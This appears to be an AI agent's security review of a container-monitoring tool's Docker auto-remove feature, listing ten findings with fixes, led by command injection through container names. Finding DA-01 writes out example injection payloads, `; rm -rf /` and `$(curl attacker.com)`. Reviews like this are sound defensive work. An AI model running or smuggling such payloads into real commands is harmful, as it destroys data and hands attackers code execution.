# Security Review: Sentinel — Docker Auto-Remove Destroyed Containers
Date: 2026-03-24
Reviewer: SecurityReviewer Agent
Task: #1624
Tools: grep-based scanning + manual review (semgrep not available)

## Summary

Reviewed the Docker auto-remove feature added to Sentinel's container monitoring. This feature detects containers that were previously monitored but no longer appear in `docker ps -a` output, and either silently removes them (ephemeral) or fires critical alerts (persistent). The implementation is well-structured with proper separation of concerns, transactional DB usage where appropriate, and good logging/audit trail. **10 findings: 0 CRITICAL, 1 HIGH, 3 MEDIUM, 3 LOW, 3 INFO.**

Overall risk: **LOW-MEDIUM**. The primary concern is command injection via container names in the restart endpoints, plus a SQL LIKE wildcard injection that could cause misresolution of alerts.

## Findings

### [DA-01] HIGH — Command Injection via Container Name in Restart Endpoints
- **File:** `src/routes/containers.js:110`
- **Source:** manual review
- **Impact:** A container name containing shell metacharacters (e.g., `; rm -rf /` or `$(curl attacker.com)`) would be passed directly to `docker restart ${name}` via `execOnHost()`, which invokes `bash -c`. An attacker who can create containers with crafted names on a monitored host could achieve remote code execution through the Sentinel API or automatic healing.
- **Evidence:**
  - `src/routes/containers.js:110`: `await execOnHost(host, \`docker restart ${name}\`, 30000);`
  - `src/alerts/healing.js:51`: `await execOnHost(host, \`docker start ${container.name}\`, 15000);`
  - `src/ssh.js:19`: `execFile('/bin/bash', ['-c', command], ...)` — `bash -c` interprets shell metacharacters
- **Fix:** Use `execFile('docker', ['restart', name])` for local execution, or for SSH, shell-escape the container name before interpolation. Better yet, validate container names against Docker's naming regex (`[a-zA-Z0-9][a-zA-Z0-9_.-]`) before use.

### [DA-02] MEDIUM — SQL LIKE Wildcard Injection in Alert Resolution
- **File:** `src/collectors/docker.js:171-177`
- **Source:** manual review
- **Impact:** Alert resolution uses `message LIKE '%${container.name}%'` to match open alerts. If a container name contains SQL LIKE wildcards (`%` or `_`), this could resolve alerts belonging to other containers. For example, a container named `%` would match ALL unresolved alerts for that host. Container names come from Docker, which does not restrict `%` or `_`.
- **Evidence:**
  ```javascript
  db.prepare(`
    UPDATE alert_history
    SET resolved_at = ?
    WHERE host_id = ?
      AND message LIKE ?
      AND resolved_at IS NULL
  `).run(now, host.id, `%${container.name}%`);
  ```
  Same pattern at line 230: `AND message LIKE ?` with `%${container.name}%DESTROYED%`
- **Fix:** Escape LIKE wildcards in container names before using them in LIKE patterns: `container.name.replace(/%/g, '\\%').replace(/_/g, '\\_')`. Or better, store `container_name` as a column in `alert_history` and match exactly instead of using LIKE against the message text.

### [DA-03] MEDIUM — No Authentication on Any API Endpoint
- **File:** `src/server.js:29-39`
- **Source:** manual review
- **Impact:** All API routes (including destructive operations like container restart, toggling persistent/auto-restart flags) are exposed without authentication. Any process or user that can reach the Sentinel port (3002) can modify monitoring state, trigger container restarts, or resolve alerts. The new `PUT /api/containers/:hostId/:name/persistent` endpoint inherits this exposure — an attacker could mark all containers as non-persistent, causing Sentinel to silently drop production containers from monitoring without alerting.
- **Evidence:** No auth middleware in `src/server.js`. No `Authorization` header checks in any route. Express app listens on `0.0.0.0` (default) not `127.0.0.1`.
- **Fix:** Add authentication middleware (API key or session-based). At minimum, bind to `127.0.0.1` if Sentinel is only used locally, or restrict to trusted IPs.

### [DA-04] MEDIUM — TOCTOU Race in Destroyed Container Detection
- **File:** `src/collectors/docker.js:58-101`
- **Source:** manual review
- **Impact:** The `handleDestroyedContainers()` call at line 74 reads from the DB to find previous containers, then the `insertMany()` at line 101 writes new ones — but these are separate operations with no enclosing transaction. A concurrent poll (or manual DB write) between these two operations could cause incorrect destroyed detection. If two polls execute overlapping for the same host, the second poll could see the first's INSERT as "previous" and skip destroyed detection entirely, or double-detect.
- **Evidence:** Line 74 `handleDestroyedContainers()` reads MAX(collected_at). Line 83-101 `insertMany` is in its own transaction, but does not include the handleDestroyedContainers read. The 30-second poll interval makes overlap unlikely but not impossible (if SSH is slow or a manual collection triggers).
- **Fix:** Wrap the entire `handleDestroyedContainers() + insertMany()` sequence in a single DB transaction.

### [DA-05] LOW — Unbounded SSE Client Connections
- **File:** `src/sse.js:4-13`
- **Source:** manual review
- **Impact:** The SSE module maintains a `Set` of response objects with no connection limit. The new `container_removed` broadcast event increases SSE traffic. An attacker could open thousands of SSE connections, exhausting memory and file descriptors. Each connection also runs a heartbeat `setInterval`.
- **Evidence:** `const clients = new Set();` with `clients.add(res)` — no size check. No rate limiting on `/api/events` (the SSE endpoint).
- **Fix:** Add a maximum client count (e.g., 100). Reject new connections with 503 when limit is reached.

### [DA-06] LOW — No Security Headers
- **File:** `src/server.js:22-27`
- **Source:** manual review
- **Impact:** No `helmet()` or equivalent security headers. Missing `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`. The SSE endpoint and JSON APIs are not at high risk for XSS, but the static HTML pages served from `/public` could be framed or injected.
- **Evidence:** Only `express.json()` and `express.static()` middleware configured. No header-setting middleware.
- **Fix:** Add `helmet` middleware or set security headers manually.

### [DA-07] LOW — IP Addresses and Credentials Paths in Config
- **File:** `config.json:11,68,75`
- **Source:** manual review
- **Impact:** Internal network IPs (`10.10.10.2`, `192.168.0.22`, `45.79.183.67`), SSH key paths (`/home/user/.ssh/id_ed25519`), and backup password file paths are committed to the repository. This aids reconnaissance if the repo is exposed.
- **Evidence:** `config.json` is tracked in git and contains all infrastructure topology.
- **Fix:** Move sensitive config to environment variables or a `.env` file excluded from git. Keep `config.json` as a template with placeholder values.

### [DA-08] INFO — Healing Log Audit Trail is Good
- **File:** `src/collectors/docker.js:179-183`, `src/alerts/healing.js:60-71`
- **Source:** manual review
- **Impact:** POSITIVE. All auto-removal and healing actions are logged to `healing_log` with container name, action, reason, and result. This provides a clear audit trail for destroyed container removals. The `container_removed` SSE broadcast at line 186 also provides real-time visibility.
- **Evidence:** Both `autoRemoveDestroyedContainer()` and `firePersistentDestroyedAlert()` log to `healing_log`. Manual restarts via API also log.

### [DA-09] INFO — Proper Use of Parameterized Queries
- **File:** `src/collectors/docker.js` (all SQL), `src/routes/containers.js` (all SQL)
- **Source:** manual review
- **Impact:** POSITIVE. All SQL queries use parameterized statements via better-sqlite3's `prepare().run()` pattern. No string interpolation in SQL. The LIKE pattern at line 177 is the only partial exception (see DA-02), but even that uses parameterized binding for the LIKE value itself.

### [DA-10] INFO — Transactional Batch Insert for Container Snapshots
- **File:** `src/collectors/docker.js:83-101`
- **Source:** manual review
- **Impact:** POSITIVE. Container snapshot inserts are wrapped in a `db.transaction()`, ensuring atomicity. If any insert fails, all roll back. The `healCrashedContainers` correctly skips `destroyed` status containers at line 40, preventing attempts to restart deleted containers.

## Files Reviewed
- `src/collectors/docker.js` — primary file under review (auto-remove logic)
- `src/alerts/engine.js` — alert evaluation engine
- `src/alerts/healing.js` — auto-restart healing logic
- `src/routes/containers.js` — container REST API (persistent flag toggle, restart)
- `src/server.js` — Express server setup
- `src/ssh.js` — SSH/local command execution
- `src/sse.js` — Server-Sent Events broadcast
- `src/config.js` — configuration loading
- `src/db/index.js` — database schema and initialization
- `config.json` — runtime configuration
- `package.json` — dependencies

## Scanning Results
- Semgrep: not available (no pip/pip3 in environment)
- Manual grep: 6 pattern classes scanned (hardcoded secrets, SQL injection, command injection, eval/exec, path traversal, dangerous functions)
- Manual review: 11 files inspected

## Dependency Status
| Package | Version | Status |
|---------|---------|--------|
| better-sqlite3 | ^11.0.0 | CLEAN — no published CVEs |
| express | ^4.21.0 | CLEAN — past CVE-2024-43796 (4.20.0+) |
| node-cron | ^4.2.1 | CLEAN — no published CVEs |
| ssh2 | ^1.17.0 | CLEAN — past CVE-2024-30260 fix |

## Quick Win Checklist
- [x] Hardcoded secrets: **PASS** — no passwords/tokens in source. SSH key paths reference files, not inline keys.
- [ ] SQL injection: **PARTIAL** — all queries parameterized, but LIKE wildcards not escaped (DA-02)
- [ ] Command injection: **FAIL** — container names interpolated into shell commands (DA-01)
- [x] XSS: **PASS** — no HTML rendering of user input. JSON-only API.
- [x] Path traversal: **PASS** — no user-controlled file paths in new code
- [ ] Auth bypass: **FAIL** — no auth exists at all (DA-03)
- [x] IDOR: **PASS** — host_id scoping is consistent across all queries
- [ ] Missing rate limiting: **FAIL** — no rate limiting on any endpoint (not new, pre-existing)

## Risk Assessment

The Docker auto-remove feature itself is **well-implemented**. The core logic correctly distinguishes ephemeral vs. persistent containers, maintains audit logs, resolves stale alerts, and broadcasts events. The persistent flag mechanism is a thoughtful addition.

The **HIGH finding (DA-01)** is the most concerning — command injection via container names affects both the new auto-remove flow (indirectly, through healing) and the existing restart API. This is exploitable if an attacker can create containers with crafted names on a monitored Docker host.

Priority fixes:
1. **DA-01** (HIGH): Sanitize/validate container names before shell interpolation
2. **DA-02** (MEDIUM): Escape LIKE wildcards or use exact column matching
3. **DA-03** (MEDIUM): Add authentication to the API
4. **DA-04** (MEDIUM): Wrap destroyed detection + insert in a single transaction
